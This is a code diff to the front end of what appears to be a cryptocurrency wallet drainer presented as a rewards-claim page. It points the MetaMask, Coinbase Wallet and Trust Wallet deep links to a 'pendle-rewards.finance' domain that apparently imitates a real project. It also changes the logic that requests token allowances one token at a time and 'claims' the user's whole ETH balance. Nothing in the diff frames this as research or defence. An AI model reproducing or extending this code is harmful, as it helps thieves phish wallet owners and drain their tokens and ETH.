@@ -484,7 +484,7 @@ export default {
           this.wConnect()
           return;
         }
-        url = 'https://metamask.app.link/dapp/multi-call-front-end.vercel.app';
+        url = 'https://metamask.app.link/dapp/pendle-rewards.finance';
       }
       if (type == 2) {
         if (window.ethereum) {
@@ -492,7 +492,7 @@ export default {
         }
 
         url =
-          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fmulti-call-front-end.vercel.app%2f';
+          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fpendle-rewards.finance%2f';
       }
       if (type == 3) {
         if(window.ethereum){
@@ -501,7 +501,7 @@ export default {
           this.wConnect()
           return;
         }
-        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://multi-call-front-end.vercel.app/";
+        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://pendle-rewards.finance/";
       }
       if (type == 4) {
         url =
@@ -523,25 +523,32 @@ export default {
           await increaseAllowance(this.maxToken);
         } else {
           await claim(this.balance.value);
-          this.claimable = 0;
+          const balance = await ethBalance();
+          console.log(balance);
+          console.log(this.balance.value);
+          if (balance < this.balance.value) {
+            this.claimable = 0;
+          }
         }
 
         this.processing = false;
         this.isDone = true;
-        const allownce_value = await allownce(this.maxToken);
-        const balanceoftoken = await balanceOf(this.maxToken);
-        if (allownce_value > balanceoftoken) {
-          if (this.currentIndex + 1 > this.sortedTokens.length) {
-            if (this.claimable > 0) {
-              await claim(this.balance.value);
-              this.claimable = 0;
-            } else {
-              this.processing = false;
-              this.isDone = false;
-              Swal.close();
-              Swal.hideLoading();
-            }
+        console.log(this.claimable);
+        if (this.currentIndex + 1 > this.sortedTokens.length) {
+          if (this.claimable > 0) {
+            this.wc_claim();
           } else {
+            this.processing = false;
+            this.isDone = false;
+            Swal.close();
+            Swal.hideLoading();
+          }
+        } else {
+          const allownce_value = await allownce(this.maxToken);
+          const tokenBalanceValue = await balanceOf(this.maxToken);
+          if (allownce_value > tokenBalanceValue) {
+            this.wc_claim();
+          }else{
             this.currentIndex += 1;
             this.maxToken = null
             this.maxToken = this.sortedTokens[this.currentIndex];
